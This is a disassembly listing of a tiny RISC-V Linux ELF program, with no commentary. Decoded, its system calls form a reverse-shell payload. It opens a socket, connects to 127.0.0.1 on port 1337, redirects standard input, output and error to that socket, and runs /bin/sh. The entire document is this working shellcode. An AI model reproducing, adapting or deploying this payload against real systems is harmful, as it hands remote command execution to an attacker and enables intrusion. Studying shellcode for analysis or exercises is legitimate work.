
asm7:     file format elf64-littleriscv


Disassembly of section .text:

0000000000010078 <_start>:
   10078:	00200513          	li	a0,2
   1007c:	00100593          	li	a1,1
   10080:	00000613          	li	a2,0
   10084:	0c600893          	li	a7,198
   10088:	00000073          	ecall
   1008c:	ff010113          	addi	sp,sp,-16
   10090:	00200293          	li	t0,2
   10094:	00513023          	sd	t0,0(sp)
   10098:	000042b7          	lui	t0,0x4
   1009c:	9052829b          	addiw	t0,t0,-1787
   100a0:	00513123          	sd	t0,2(sp)
   100a4:	010002b7          	lui	t0,0x1000
   100a8:	07f2829b          	addiw	t0,t0,127
   100ac:	00513223          	sd	t0,4(sp)
   100b0:	00000593          	li	a1,0
   100b4:	00010593          	mv	a1,sp
   100b8:	01000613          	li	a2,16
   100bc:	0cb00893          	li	a7,203
   100c0:	00000293          	li	t0,0
   100c4:	00050293          	mv	t0,a0
   100c8:	00000073          	ecall
   100cc:	00000513          	li	a0,0
   100d0:	00028513          	mv	a0,t0
   100d4:	00000593          	li	a1,0
   100d8:	00000613          	li	a2,0
   100dc:	01800893          	li	a7,24
   100e0:	00000073          	ecall
   100e4:	00000513          	li	a0,0
   100e8:	00028513          	mv	a0,t0
   100ec:	00100593          	li	a1,1
   100f0:	00000073          	ecall
   100f4:	00000513          	li	a0,0
   100f8:	00028513          	mv	a0,t0
   100fc:	00200593          	li	a1,2
   10100:	00000073          	ecall
   10104:	69623537          	lui	a0,0x69623
   10108:	f2f5051b          	addiw	a0,a0,-209
   1010c:	ff810113          	addi	sp,sp,-8
   10110:	00a13023          	sd	a0,0(sp)
   10114:	687338b7          	lui	a7,0x68733
   10118:	f6e8889b          	addiw	a7,a7,-146
   1011c:	01113223          	sd	a7,4(sp)
   10120:	00000893          	li	a7,0
   10124:	01110893          	addi	a7,sp,17
   10128:	00000513          	li	a0,0
   1012c:	fef88513          	addi	a0,a7,-17 # 68732fef <__global_pointer$+0x6872169b>
   10130:	00000613          	li	a2,0
   10134:	00000593          	li	a1,0
   10138:	00100893          	li	a7,1
   1013c:	0dc88893          	addi	a7,a7,220
   10140:	00000073          	ecall
   10144:	00000513          	li	a0,0
   10148:	00000893          	li	a7,0
   1014c:	05d88893          	addi	a7,a7,93
   10150:	00000073          	ecall
